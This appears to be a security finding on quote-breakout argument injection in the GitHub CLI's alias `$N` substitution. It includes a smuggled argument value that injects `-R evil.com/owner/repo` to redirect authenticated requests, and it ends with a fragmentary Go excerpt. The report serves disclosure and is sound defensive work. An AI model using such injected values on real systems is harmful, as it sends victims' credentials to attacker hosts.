### Title
Quote-breakout in alias `$N` substitution allows argument/flag injection (e.g. `-R host/owner/repo`) via attacker-controlled placeholder values - ([File: pkg/cmd/root/alias.go])

### Summary
`expandAlias` substitutes `$N` placeholders into the alias expansion text with a raw `strings.ReplaceAll`, before the whole string is re-tokenized with `shlex.Split`. If the substituted value contains a quote character, it breaks out of the quoted context that the alias author wrote (e.g. `--author="$1"`) and is re-tokenized into new, unintended shlex arguments/flags, including `-R HOST/OWNER/REPO`, which can redirect the invoked subcommand to an attacker-chosen host and repository.

### Finding Description
`expandAlias` performs naive text substitution: [1](#0-0) 
The value is inserted directly into the expansion string (which may already contain literal quote characters written by the alias author, e.g. `issue list --author="$1"`, an example that is itself documented as the recommended alias pattern in `pkg/cmd/alias/set/set.go`), and only afterward is the whole string handed to `shlex.Split`. `shlex.Split` performs standard shell-like quote/token parsing, so a value containing a `"` character terminates the quoted segment early and everything after it is parsed as new, independent tokens.

For example, with alias expansion `issue list --author="$1"` and `args[0]` = `x" -R evil.com/owner/repo -a "`, after `ReplaceAll` the string becomes:
```
issue list --author="x" -R evil.com/owner/repo -a ""
```
`shlex.Split` on this text yields `["issue","list","--author=x","-R","evil.com/owner/repo","-a",""]` — two brand-new tokens `-R` and `evil.com/owner/repo` that were never part of the alias definition. These are then passed to `root.SetArgs(expanded)` and `root.Execute()`: [2](#0-1) 
The `-R`/`--repo` flag is registered by `EnableRepoOverride` and accepts the `[HOST/]OWNER/REPO` format with no host allowlist: [3](#0-2) [4](#0-3) 
`ghrepo.FromFullName`/`FromFullNameWithHost` accept an arbitrary hostname component with no restriction to github.com or the configured hosts: [5](#0-4) 
There is no existing mitigation in `expandAlias` (no escaping/quoting of the substituted value, no restriction on characters allowed in `$N` arguments, no re-validation that the resulting shlex token count matches expectations).

### Impact Explanation
An attacker who only controls a value the victim later pastes as a positional alias argument (a branch name, issue/PR title, gist filename, etc., copied from attacker-published GitHub content) can inject extra CLI tokens into the victim's own trusted alias invocation. The clearest concrete impact is wrong-host/wrong-repo request routing via injected `-R host/owner/repo` or `--repo=host/owner/repo`, causing the victim's `gh` invocation to send an authenticated API request (with the victim's stored token) to an attacker-controlled host/repo. Depending on the subcommand being aliased (e.g. one that uploads content, secrets, or performs write operations), this can also enable unintended cross-repo actions or credential-bearing requests to an attacker host — matching the "authenticated request to an attacker host" / "wrong-host or wrong-account request routing" bounty impact classes.

### Likelihood Explanation
Requires: (1) the victim to have defined a non-shell alias using a `$N` placeholder inside quotes (an officially documented, recommended pattern), and (2) the victim to invoke that alias with an attacker-influenced value containing a `"` character (e.g. copy-pasting a branch name or title from attacker content). Both preconditions are plausible: quoted placeholders are the documented idiom for aliases taking free-text arguments (author, label, title), and copy-pasting untrusted text into CLI arguments is a common workflow. The bug is deterministic and 100% reproducible once the two preconditions hold — no timing or race conditions involved.

### Recommendation
Do not perform raw string substitution followed by shell-like re-tokenization. Instead, tokenize the alias expansion first (respecting the author's own quoting), then substitute `$N` values as literal argv elements (never re-parsed), similar to how `os/exec` treats argv elements as opaque. Alternatively, reject/escape quote characters in substituted `$N` values, or perform substitution only after `shlex.Split` at the token level so injected quote characters cannot create new tokens.

func expandAlias(expansion string, args []string) ([]string, error) {
	extraArgs := []string{}
	for i, a := range args {
		if !strings.Contains(expansion, "$") {
			extraArgs = append(extraArgs, a)
		} else {
			expansion = strings.ReplaceAll(expansion, fmt.Sprintf("$%d", i+1), a)
		}
	}

		return nil, fmt.Errorf("not enough arguments for alias: %s", expansion)
